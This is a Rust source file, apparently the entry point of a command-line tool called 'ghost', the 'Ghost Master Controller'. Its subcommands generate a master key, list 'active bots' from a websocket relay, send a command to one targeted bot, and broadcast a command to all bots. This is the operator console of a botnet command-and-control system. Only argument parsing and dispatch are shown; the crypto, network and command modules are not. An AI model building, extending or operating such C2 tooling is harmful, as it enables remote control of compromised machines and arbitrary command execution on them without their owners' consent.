use clap::{Parser, Subcommand};
use std::path::PathBuf;

mod crypto;
mod network;
mod commands;

#[derive(Parser)]
#[command(name = "ghost")]
#[command(about = "The Ghost Master Controller", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Generate Master Identity
    Keygen {
        #[arg(short, long, default_value = "master.key")]
        output: PathBuf,
    },
    /// List active bots from Relay
    List {
        #[arg(short, long, default_value = "ws://localhost:8080")]
        relay: String,
    },
    /// Target a specific bot
    Target {
        #[arg(short, long, default_value = "ws://localhost:8080")]
        relay: String,
        #[arg(short, long, default_value = "master.key")]
        key: PathBuf,
        #[arg(long)]
        target: String,
        #[arg(long)]
        cmd: String,
    },
    /// Broadcast command to ALL bots
    Broadcast {
        #[arg(short, long, default_value = "ws://localhost:8080")]
        relay: String,
        #[arg(short, long, default_value = "master.key")]
        key: PathBuf,
        #[arg(long)]
        cmd: String,
    },
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();
    match cli.command {
        Commands::Keygen { output } => commands::handle_keygen(output).await,
        Commands::List { relay } => commands::handle_list(relay).await,
        Commands::Target { relay, key, target, cmd } => commands::handle_target(relay, key, target, cmd).await,
        Commands::Broadcast { relay, key, cmd } => commands::handle_broadcast(relay, key, cmd).await,
    }
}
